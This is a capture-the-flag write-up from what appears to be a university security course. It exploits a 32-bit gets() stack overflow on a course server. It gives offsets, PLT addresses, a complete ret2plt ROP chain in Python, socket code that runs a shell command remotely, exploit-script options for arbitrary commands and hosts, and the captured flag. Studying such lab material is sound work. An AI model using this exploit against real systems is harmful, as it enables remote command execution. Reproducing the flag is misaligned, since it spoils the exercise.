# Attack Binary Ret2PLT Exploit

## Overview
**Vulnerability:** Stack buffer overflow via `gets()` in 32-bit binary  
**Target:** `moa6.eecs.utk.edu:9995`  
**Method:** Return-to-PLT chain (ret2plt) with two-stage `gets()` + `system()` gadgets  
**Flag:** `cosc466-flag-{EkwrwC26jrWfffn8nUvMRq5Q}`

---

## Vulnerability

The `cmd()` function in `attack.c` uses `gets(buffer)` to read a 12-byte buffer with no bounds checking. Input longer than 12 bytes overwrites the saved return address on the stack, allowing code execution redirection.

---

## Key Addresses & Offsets

| Item | Address |
|------|---------|
| Buffer size | 12 bytes |
| Offset to EIP | 24 bytes |
| `gets@plt` | `0x08049070` |
| `system@plt` | `0x080490a0` |
| `exit@plt` | `0x080490b0` |
| `pop ebx; ret` gadget | `0x0804901e` |
| Writable memory (`.bss`) | `0x0804c140` |

---  

## Using the Script

### Quick Start (Remote)
```bash
cd /home/judah/CS466
python3 ctf/13-attack-ret2libc/exploit.py
```

### Against Local Binary
```bash
python3 ctf/13-attack-ret2libc/exploit.py --local
```

### Custom Command
```bash
python3 ctf/13-attack-ret2libc/exploit.py --command "ls -la"
```

### Custom Remote Target
```bash
python3 ctf/13-attack-ret2libc/exploit.py --host example.com --port 9995
```

---

## Manual Exploitation (By Hand)

### Step 1: Build the Payload
Create a binary ROP chain:

```python
import struct

offset = 24
gets_plt = 0x08049070
system_plt = 0x080490a0
exit_plt = 0x080490b0
pop_ret = 0x0804901e
writable = 0x0804c140

# Padding to reach EIP
payload = b"A" * offset

# Stage 1: Call gets(writable_addr) to read the command
payload += struct.pack("<I", gets_plt)
payload += struct.pack("<I", pop_ret)      # Return address for gets
payload += struct.pack("<I", writable)     # Argument to gets

# Stage 2: Call system(writable_addr) with the command we wrote
payload += struct.pack("<I", system_plt)
payload += struct.pack("<I", exit_plt)     # Return address for system
payload += struct.pack("<I", writable)     # Argument to system (the command)
```

### Step 2: Send Payload + Command
```bash
python3 << 'EOF'
import socket
import struct

# Payload construction (from above)
payload = b"..."  # 24 bytes padding + ROP chain

command = b"cat flag.txt"

# Connect to remote
sock = socket.create_connection(("moa6.eecs.utk.edu", 9995), timeout=10)

# Send: payload + newline + command + newline
sock.sendall(payload + b"\n" + command + b"\n")

# Read response
sock.shutdown(socket.SHUT_WR)
output = sock.recv(4096)
print(output.decode('latin1', errors='ignore'))
sock.close()
EOF
```

### Step 3: Read the Flag
The server executes `cat flag.txt` and returns:
```
cosc466-flag-{EkwrwC26jrWfffn8nUvMRq5Q}
```

---

## How It Works (Technical)

1. **Overflow:** Send 24 bytes of padding + ROP addresses  
2. **Return to `gets@plt`:** The overflow redirects execution to PLT entry for `gets()`  
3. **Read Command:** `gets()` reads the second input line (your command) into writable memory  
4. **Return to `system@plt`:** After `gets()` returns, execute `system()` with the command string  
5. **Clean Exit:** `exit()` cleanly terminates the connection

The trick: We chain two PLT calls using a `pop-ret` gadget to set up function arguments properly on the 32-bit x86 calling convention.
